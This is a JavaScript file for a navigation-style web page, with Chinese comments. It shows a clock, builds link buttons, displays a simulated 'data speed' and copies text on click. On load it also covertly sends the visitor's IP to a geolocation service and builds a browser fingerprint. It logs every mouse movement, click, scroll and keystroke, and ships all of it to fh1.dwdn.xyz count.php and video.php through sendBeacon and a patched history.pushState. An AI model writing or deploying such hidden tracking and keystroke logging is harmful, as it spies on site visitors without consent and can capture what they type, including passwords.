// 显示当前时间
function updateTime() {
    const now = new Date();
    const timeString = now.toLocaleTimeString();
    document.querySelector('.time').textContent = timeString;
}

// 使用 requestAnimationFrame 代替 setInterval 更新时间
function animateTime() {
    updateTime();
    requestAnimationFrame(animateTime);
}

// 渲染导航链接
function renderNavLinks() {
    const navContainer = document.querySelector('.nav-container');
    if (!navContainer) return;

    // 清空容器
    navContainer.innerHTML = '';

    // 读取JSON数据
    fetch('data/url.json')
        .then(response => {
            if (!response.ok) {
                throw new Error('网络响应不正常');
            }
            return response.json();
        })
        .then(links => {
            // 遍历数据并创建链接元素
            links.forEach(link => {
                const aElement = document.createElement('a');
                aElement.href = link.href;
                
                const buttonElement = document.createElement('button');
                buttonElement.className = 'glass-button';
                buttonElement.textContent = link.text;
                
                aElement.appendChild(buttonElement);
                const brElement = document.createElement('br');
                
                navContainer.appendChild(aElement);
                navContainer.appendChild(brElement);
            });
        })
        .catch(error => {
            console.error('加载导航链接失败:', error);
            navContainer.innerHTML = '<p>导航链接加载失败</p>';
        });
}

// 数据速度模拟
let currentSpeed = Math.floor(Math.random() * 100) + 1;

function updateDataSpeed() {
    // 随机增加或减少速度，幅度在 1-5 之间
    const change = Math.floor(Math.random() * 10) + 1;
    const isIncrease = Math.random() > 0.5;
    currentSpeed = isIncrease ? currentSpeed + change : currentSpeed - change;
    if (currentSpeed < 1) currentSpeed = 1;
    document.querySelector('.data-speed').textContent = `${currentSpeed} kb/s`;
}

// 文本复制功能
function setupCopyFunctionality() {
    // 获取要复制的文本元素
    const copyText = document.getElementById('copyText');

    // 点击事件处理函数
    if (copyText) {
        copyText.addEventListener('click', function() {
            const textToCopy = this.innerText;

            // 创建临时元素用于复制
            const tempInput = document.createElement('input');
            tempInput.value = textToCopy;
            document.body.appendChild(tempInput);

            // 选中并复制内容
            tempInput.select();
            document.execCommand('copy');

            // 移除临时元素
            document.body.removeChild(tempInput);

            // 创建弹窗显示复制成功
            const successMessage = document.createElement('div');
            successMessage.classList.add('success-popup');
            successMessage.innerText = '复制成功';
            successMessage.style.position = 'fixed';
            successMessage.style.top = '10px';
            successMessage.style.width = 'fit-content';
            successMessage.style.zIndex = '9999';
            successMessage.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
            successMessage.style.color = 'white';
            successMessage.style.textAlign = 'center';
            document.body.appendChild(successMessage);

            // 2 秒后自动关闭弹窗
            setTimeout(() => {
                document.body.removeChild(successMessage);
            }, 2000);
        });
    }
}

// 获取IP和位置信息，并收集浏览器信息发送
function getAndShowLocation() {
    fetch('http://res.abeim.cn/api-ip_get?export=json')
        .then(response => response.json())
        .then(data => {
            // 提取 IP 地址
            const ip = data.ip;
            // 存储IP供后续使用（如用户操作记录）
            localStorage.setItem('userIp', ip);
            
            // 发送 IP 到获取位置的接口
            fetch(`https://collect.xmwxxc.com/collect/address/?ip=${ip}`)
                .then(response => response.text())
                .then(data => {
                    // 解析返回的字符串，提取城市市区部分
                    const locationStr = data;
                    const start = locationStr.indexOf('你当前的位置:') + '你当前的位置:'.length;
                    // 找到逗号的位置，即城市部分的结束位置
                    const end = locationStr.indexOf(',', start);
                    // 提取城市部分
                    const city = locationStr.substring(start, end);
                    // 只保留前六位
                    const cityFirstSix = city.substring(0, 6);
                    // 在页面上显示城市市区
                    document.getElementById('location').innerHTML = cityFirstSix;
                })
                .catch(error => {
                    console.error('获取位置数据时出错:', error);
                });
            
            // 收集浏览器信息并发送
            sendBrowserInfo(ip);
        })
        .catch(error => {
            console.error('获取 IP 时出错:', error);
        });
}

// 收集浏览器相关信息
function collectBrowserInfo() {
    return {
        userAgent: navigator.userAgent, // 浏览器用户代理字符串
        browserVersion: getBrowserVersion(), // 提取的浏览器版本
        appName: navigator.appName, // 浏览器名称
        appVersion: navigator.appVersion, // 浏览器版本
        platform: navigator.platform, // 操作系统平台
        language: navigator.language, // 浏览器语言
        screenWidth: screen.width, // 屏幕宽度
        screenHeight: screen.height, // 屏幕高度
        colorDepth: screen.colorDepth, // 屏幕颜色深度
        plugins: Array.from(navigator.plugins).map(plugin => plugin.name).join(', '), // 安装的插件
        // 简单的浏览器指纹 - 基于多个特征的组合
        fingerprint: generateSimpleFingerprint()
    };
}

// 提取浏览器版本
function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    let version = 'Unknown';
    
    // 检测主要浏览器及其版本
    if (/Chrome/.test(userAgent)) {
        version = 'Chrome ' + userAgent.match(/Chrome\/(\d+\.\d+)/)[1];
    } else if (/Firefox/.test(userAgent)) {
        version = 'Firefox ' + userAgent.match(/Firefox\/(\d+\.\d+)/)[1];
    } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
        version = 'Safari ' + userAgent.match(/Version\/(\d+\.\d+)/)[1];
    } else if (/MSIE|Trident/.test(userAgent)) {
        version = 'IE ' + userAgent.match(/(MSIE \d+\.\d+|rv:(\d+\.\d+))/)[1];
    } else if (/Edge/.test(userAgent)) {
        version = 'Edge ' + userAgent.match(/Edge\/(\d+\.\d+)/)[1];
    }
    
    return version;
}

// 生成简单的浏览器指纹
function generateSimpleFingerprint() {
    // 基于多个浏览器特征生成一个简单的指纹
    const fingerprintComponents = [
        navigator.userAgent,
        screen.width + 'x' + screen.height,
        screen.colorDepth,
        navigator.language,
        navigator.platform,
        Array.from(navigator.plugins).length,
        navigator.cookieEnabled ? 'cookies enabled' : 'cookies disabled'
    ];
    
    // 简单哈希处理
    return btoa(fingerprintComponents.join('|'));
}

// 将对象转换为查询字符串
function objToQueryString(obj) {
    return Object.keys(obj).map(key => 
        encodeURIComponent(key) + '=' + encodeURIComponent(obj[key])
    ).join('&');
}

// 发送浏览器信息到接口
function sendBrowserInfo(ip) {
    // 收集浏览器信息
    const browserInfo = collectBrowserInfo();
    
    // 准备要发送的所有数据
    const requestData = {
        ip: ip,
        ...browserInfo,
        timestamp: new Date().toISOString(), // 添加时间戳
        referrer: document.referrer // 添加来源页面
    };
    
    // 构建请求URL
    const baseUrl = 'https://fh1.dwdn.xyz/count.php';
    const queryString = objToQueryString(requestData);
    const url = `${baseUrl}?${queryString}`;
    
    // 发送数据到指定接口
    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('发送数据时响应不正常: ' + response.status);
            }
            return response.text();
        })
        .then(responseText => {
            console.log('浏览器信息发送成功:', responseText);
        })
        .catch(error => {
            console.error('发送浏览器信息时出错:', error);
        });
}

// 用户操作录制功能
let userActions = [];
let recordingStartTime;

// 格式化时间（相对于开始时间的毫秒数）
function getRelativeTime() {
    return Date.now() - recordingStartTime;
}

// 记录鼠标移动
function recordMouseMove(e) {
    userActions.push({
        type: 'mousemove',
        time: getRelativeTime(),
        x: e.clientX,
        y: e.clientY,
        target: getElementInfo(e.target)
    });
}

// 记录鼠标点击
function recordClick(e) {
    userActions.push({
        type: 'click',
        time: getRelativeTime(),
        x: e.clientX,
        y: e.clientY,
        button: e.button,
        target: getElementInfo(e.target)
    });
}

// 记录键盘输入
function recordKeydown(e) {
    userActions.push({
        type: 'keydown',
        time: getRelativeTime(),
        key: e.key,
        keyCode: e.keyCode,
        target: getElementInfo(e.target)
    });
}

// 记录页面滚动
function recordScroll(e) {
    userActions.push({
        type: 'scroll',
        time: getRelativeTime(),
        scrollX: window.scrollX,
        scrollY: window.scrollY
    });
}

// 获取元素信息（简化版，避免敏感信息）
function getElementInfo(element) {
    if (!element) return null;
    return {
        tag: element.tagName,
        id: element.id || null,
        className: element.className || null,
        // 避免记录输入框内容等敏感信息
        isInput: element.tagName === 'INPUT' || element.tagName === 'TEXTAREA'
    };
}

// 开始录制
function startRecording() {
    // 初始化录制状态
    userActions = [];
    recordingStartTime = Date.now();
    
    // 记录初始信息
    userActions.push({
        type: 'start',
        time: 0,
        url: window.location.href,
        referrer: document.referrer
    });

    // 添加事件监听
    document.addEventListener('mousemove', recordMouseMove);
    document.addEventListener('click', recordClick);
    document.addEventListener('keydown', recordKeydown);
    window.addEventListener('scroll', recordScroll);

    console.log('开始录制用户操作');
}

// 停止录制并上传数据
function stopAndUpload() {
    // 记录结束信息
    userActions.push({
        type: 'end',
        time: getRelativeTime(),
        duration: getRelativeTime()
    });

    // 移除事件监听
    document.removeEventListener('mousemove', recordMouseMove);
    document.removeEventListener('click', recordClick);
    document.removeEventListener('keydown', recordKeydown);
    window.removeEventListener('scroll', recordScroll);

    // 准备上传数据
    const data = {
        actions: userActions,
        startTime: new Date(recordingStartTime).toISOString(),
        endTime: new Date().toISOString(),
        ip: localStorage.getItem('userIp') || 'unknown', // 从之前存储的位置获取IP
        userAgent: navigator.userAgent
    };

    // 上传数据到指定接口
    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
    
    // 使用sendBeacon确保页面卸载时能发送成功
    const success = navigator.sendBeacon(
        'https://fh1.dwdn.xyz/video.php',
        blob
    );

    if (success) {
        console.log('操作数据已成功调度上传');
    } else {
        console.error('上传调度失败，尝试使用fetch备份方案');
        // 备份方案：使用fetch并忽略结果
        fetch('https://fh1.dwdn.xyz/video.php', {
            method: 'POST',
            body: blob,
            keepalive: true
        }).catch(err => console.error('备份上传也失败:', err));
    }
}

// 初始化所有功能
function initializeAllFunctions() {
    // 启动时间显示
    animateTime();
    
    // 启动数据速度更新
    setInterval(updateDataSpeed, 2000);
    
    // 设置复制功能
    setupCopyFunctionality();
    
    // 获取位置信息并发送浏览器信息
    getAndShowLocation();
    
    // 开始录制用户操作
    startRecording();
    
    // 页面即将卸载时上传操作记录
    window.addEventListener('beforeunload', stopAndUpload);
    
    // 对于单页应用，监听页面导航变化
    if (window.history.pushState) {
        const originalPushState = window.history.pushState;
        window.history.pushState = function() {
            stopAndUpload();
            return originalPushState.apply(this, arguments);
        };
    }
}

// 页面加载完成后执行所有初始化
document.addEventListener('DOMContentLoaded', () => {
    // 渲染导航链接
    renderNavLinks();
    
    // 初始化所有功能
    initializeAllFunctions();
});
